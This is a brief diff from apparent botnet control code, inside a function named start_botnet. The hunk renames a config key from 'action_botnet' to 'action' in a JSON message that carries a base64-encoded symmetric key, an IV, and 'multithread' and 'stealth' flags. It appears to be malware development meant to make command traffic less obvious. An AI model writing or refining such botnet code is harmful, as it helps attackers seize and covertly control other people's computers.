@@ -115,7 +115,7 @@ def start_botnet():
                 # print("symetric key : " + str(sym_key))
                 # print("iv : " + str(iv))
 
-                json_conf = '{"action_botnet":"' + base64.b64encode(
+                json_conf = '{"action":"' + base64.b64encode(
                     "client_config".encode()).decode() + '","b64symetric":"' + base64.b64encode(
                     sym_key).decode() + '","b64iv":"' + base64.b64encode(
                     iv).decode() + '","multithread":true,"stealth":true}'
